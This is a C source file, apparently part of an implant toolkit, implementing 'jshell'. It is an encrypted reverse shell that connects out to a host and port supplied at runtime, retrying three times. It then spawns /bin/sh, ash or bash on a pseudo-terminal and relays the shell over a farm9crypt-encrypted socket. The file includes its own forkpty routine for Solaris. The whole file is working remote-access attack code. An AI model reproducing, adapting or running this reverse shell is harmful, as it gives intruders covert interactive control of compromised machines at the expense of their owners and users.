#include "jshell.h"

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <string.h>

#include "farm9crypt.h"
#include "polarssl/net.h"
#include "debug.h"
#include "shuffle.h"

#ifdef	LINUX
#include <pty.h>
#endif

#ifdef	SOLARIS
#include <fcntl.h>
#include <sys/stropts.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stropts.h>
#include <fcntl.h>
#include <errno.h>

int forkpty( int *amaster, char *name, void *unused1, void *unused2 ) {
	
    char	*slave; 
    int		pid, pty, tty;

	// to silence compiler warnings
	unused1 = unused1;
	unused2 = unused2;

    /* request a pseudo-terminal */
    pty = open( "/dev/ptmx", O_RDWR | O_NOCTTY );

    if( pty < 0 )
    {
		D( perror( " ! open( /dev/ptmx ):" ); )	
		return( -1 );
    }

    if( grantpt( pty ) < 0 )
    {
		D( perror( " ! grantpt(): " ); )
		return( -1 );
    }

    if( unlockpt( pty ) < 0 )
    {
		D( perror( " ! unlockpt(): " ); )
		return( -1 );
    }

    slave = ptsname( pty );

    if( slave == NULL )
    {
		D( perror( " ! ptsname(): " ); )
		return( -1 );
    }

	if ( name ) strcpy( name, slave );

	if ( amaster ) *amaster = pty;
	D( printf( " . pty is fd = %i\n", pty ); )

    /* fork to spawn a shell */
    pid = fork();

    if( pid < 0 )
    {
		D( perror( " ! fork():" ); )	
		return( -1 );
    }

    if( pid == 0 )
    {
        /* close the pty (master side) */
		/* the client socket is closed by the caller */
        close( pty );

	    tty = open( slave, O_RDWR | O_NOCTTY );

	    if( tty < 0 )
    	{
			D( perror( " ! open( slave ): " ); )
			return( -1 );
    	}

	    if( ioctl( tty, I_PUSH, "ptem" ) < 0 )
    	{
			D( perror( " ! ioctl( ptem ):" ); )	
			return( -1 );
    	}

	    if( ioctl( tty, I_PUSH, "ldterm" ) < 0 )
    	{
			D( perror( " ! ioctl( ldterm ):" ); )	
			return( -1 );
    	}

	    if( ioctl( tty, I_PUSH, "ttcompat" ) < 0 )
    	{
			D( perror( " ! ioctl( ttcompat ):" ); )	
			return( -1 );
    	}

        /* create a new session */
        if( setsid() < 0 )
        {
			D( perror( " ! setsid():" ); )	
        	return( -1 );
        }

        /* set controlling tty, to have job control */

        int fd;

        fd = open( slave, O_RDWR );

        if( fd < 0 )
        {
			D( perror( " ! open( slave )" ); )
			return( 46 );
        }

        close( tty );

        tty = fd;

        /* tty becomes stdin, stdout, stderr */
        dup2( tty, 0 );
        dup2( tty, 1 );
        dup2( tty, 2 );

        if( tty > 2 )
        {
            close( tty );
        }

//		execl( "/bin/sh", "sh", (char *)0 );

        return( 0 );
    }
    else
    {
        return( pid );
    }

    /* not reached */
    return( -1 );
}
#endif // #ifdef SOLARIS

// configured to call-out only
void *jshell( void *input ) {

	int		netfd;
	int		pid;
	int		pty;
	int		tries = 3;

	char	*host = strtok( input, " " );
	char	*port = strtok( NULL, " " );
	char	*key = strtok( NULL, " " );

	D( printf( " . Host: %s, Port: %i, Key: %s\n", host, atoi( port ), key ); )

	farm9crypt_init( key );

	while ( tries > 0 )
	{
		if ( net_connect( &netfd, host, atoi( port ) ) != 0 )
		{
			D( printf( " ! net_connect() failed @ %s:%i\n", __FILE__, __LINE__ ); )
			sleep( 1 );
			tries--;
		}
		else
		{
			D( printf( " . net_connect() success\n" ); )
			break;
		}
	}
	if ( tries == 0 )
	{
		D( printf( " ! exceeded connection attempts. now exiting.\n" ); )
		return (void *)-1;
	}

	D( printf( " . netfd = %i\n", netfd ); )


	pid = forkpty( &pty, NULL, NULL, NULL );

	if ( pid < 0 )
	{
		D( perror( " ! fork()" ); )
		D( printf ( " . Returning from jshell()\n" ); )
		return (void *)-1;
	}
	
	if ( pid == 0 )
	{
		// this is the child
		close( netfd );

#ifdef	_USE_ASH
		execl( "/bin/ash", "ash", (char *)0 );
#elif	_USE_BASH
		execl( "/bin/bash", "bash", (char *)0 );
#else
		execl( "/bin/sh", "sh", (char *)0 );
#endif
	
		// not reached
		return (void *)-1;
	}
	else
	{
		// this is the parent
		D( printf( " . pre shuffle\n" ); )
		shuffle( pty, netfd );
		D( printf( " . post shuffle\n" ); )

		D( printf ( " . Returning from jshell()\n" ); )
		return (void *)0;
	}

	// not reached
	return (void *)0;
}
